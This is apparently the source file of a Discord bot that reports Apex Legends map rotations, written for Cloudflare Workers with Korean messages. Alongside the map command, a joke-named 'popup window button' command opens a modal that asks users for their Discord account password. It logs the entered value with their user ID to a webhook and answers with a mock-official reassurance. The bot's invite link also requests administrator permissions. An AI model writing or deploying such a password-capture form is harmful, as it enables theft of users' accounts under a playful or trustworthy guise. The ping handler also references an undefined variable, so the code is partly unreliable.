import { Router as IttyRouter } from 'itty-router';
import { JsonResponse, ALS_API, WebLogger, formatMinutes, escapeMarkdown } from "./modules/tweak_functions.js";
import {
	InteractionType, InteractionResponseType, InteractionResponseFlags,
	MessageComponentTypes,
	ButtonStyleTypes, TextStyleTypes,
	verifyKey
} from 'discord-interactions';
const Router = IttyRouter();
let Logger = null;
let ALS = null;


Router.post('/', async request => {
	const message = await request.json();

	// 리퀘스트: 디스코드에서 핑 요청 받음
	if(message.type == InteractionType.PING) {
		Logger.log(`I just received the Discord ping request!\`\`\`${JSON.stringify(body)}\`\`\``);
		return new JsonResponse({
			type: InteractionResponseType.PONG
		});
	}
	// 리퀘스트: 모달 전송됨
	if(message.type == InteractionType.APPLICATION_MODAL_SUBMIT) {
		switch(message.data.custom_id) {
			case "popup_window": {
				Logger.log(`<@${message.member.user.id}> | 빠빱\\_윈또우\\_뻐뜬 > \`\`${escapeMarkdown(message.data.components[0].components[0].value)}\`\``);
				return new JsonResponse({
					type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
					data: {
						content: `<@${message.member.user.id}>, 매우 즐거운 귀하의 계정! 당국이 계정을 안전하게 보호할 것이다 입니다.`,
						flags: InteractionResponseFlags.EPHEMERAL
					}
				});
			};
			default: {
				Logger.log(`WARN: Unknown modal id: ${message.data.custom_id}`);
				return new Response(`Unknown modal id: ${message.data.custom_id}`, {status: 400});
			};
		};
	}
	// 리퀘스트: 버튼 클릭함
	if(message.type == InteractionType.MESSAGE_COMPONENT) {
		switch(message.data.custom_id) {
			case "popup_window_button": {
				return new JsonResponse({
					type: InteractionResponseType.APPLICATION_MODAL,
					data: {
						title: "이것은 빠빱_윈또우 이다",
						custom_id: "popup_window",
						components: [{
							type: MessageComponentTypes.ACTION_ROW,
							components: [{
								type: MessageComponentTypes.INPUT_TEXT,
								style: TextStyleTypes.SHORT,
								label: "Discord 계정 비밀번호를 입력해주세요.",
								required: true,
								custom_id: "popup_window_pw"
							}]
						}]
					}
				});
			};
			default: {
				Logger.log(`WARN: Unknown component id: ${message.data.custom_id}`);
				return new Response(`Unknown component id: ${message.data.custom_id}`, {status: 400});
			};
		};
	}
	// 리퀘스트: 슬래시 커맨드
	if(message.type == InteractionType.APPLICATION_COMMAND) {
		switch (message.data.name) {
			case "맵": {
				const als = await ALS.send("maprotation", {version: 2});
				const selectedOption = message.data?.options?.[0]?.value ?? "battle_royale";
				const gamemodeName = ALS.lang('gamemode', selectedOption);
				const data = als[selectedOption];

				return new JsonResponse({
					type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
					data: {
						embeds: [{
							title: `:map: 현재 맵: \`${data.current.map}\``,
							description: `> <t:${data.current.start}:R>에 시작되었습니다.`,
							image: {"url": data.current.asset},
							footer: {"text": `이 맵은 ${formatMinutes(data.current.DurationInMinutes)}동안 유지됩니다`}
						}, {
							title: `:map: 다음 맵: \`${data.next.map}\``,
							description: `> <t:${data.next.start}:R>에 시작됩니다.`,
							image: {"url": data.next.asset},
							footer: {"text": `이 맵은 ${formatMinutes(data.next.DurationInMinutes)}동안 유지됩니다`}
						}]
					}
				});
			};
			case "빠빱윈또우뻐뜬": {
				return new JsonResponse({
					type: InteractionResponseType.CHANNEL_MESSAGE_WITH_SOURCE,
					data: {
						content: `빠빱\\_윈또우\\_뻐뜬`,
						components: [{
							type: MessageComponentTypes.ACTION_ROW,
							flags: InteractionResponseFlags.EPHEMERAL,
							components: [{
								type: MessageComponentTypes.BUTTON,
								style: ButtonStyleTypes.PRIMARY,
								label: "popup_window_button",
								custom_id: "popup_window_button"
							}]
						}]
					}
				});
			};
			default: {
				Logger.log(`WARN: Unknown command name: ${message.data.name}`);
				return new Response(`Unknown command name: ${message.data.name}`, {status: 400});
			};
		};
	}
	
	// Handler for http requests
	Logger.log(`WARN: Unknown message type: ${message.type}`);
	return new Response(`Unknown message type: ${message.type}`, {status: 400});
});
Router.get("/invite", async request => {
	return Response.redirect("https://discord.com/api/oauth2/authorize?client_id=1028919324439752736&permissions=8&scope=bot%20applications.commands", 302);
});
Router.all('*', async request => {
	//logger.log(`LOG: ALL(*) request just received!\nbody:\`\`\`${JSON.stringify(request)}\`\`\``);
	return new Response("No bitches lol", {status: 404});
});




export default {
	async fetch(request, env, context) {
		Logger = new WebLogger(env.LOG_WEBHOOK_ID, env.LOG_WEBHOOK_TOKEN);
		ALS = new ALS_API(env.ALS_TOKEN);

		console.log(JSON.stringify(request));
		if(request.method === 'POST') {
			const signature = request.headers.get('x-signature-ed25519');
			const timestamp = request.headers.get('x-signature-timestamp');
			const body = await request.clone().arrayBuffer();
			
			if(!verifyKey(body, signature, timestamp, env.DISCORD_PUBLIC_KEY)) {
				Logger.log(`WARN: Signature verification failed!\`\`\`${JSON.stringify(body)}\`\`\``);
				return new Response("Signature verification failed", {status: 401});
			}
		}
		// Dispatch the request to the appropriate route
		return Router.handle(request);
	}
};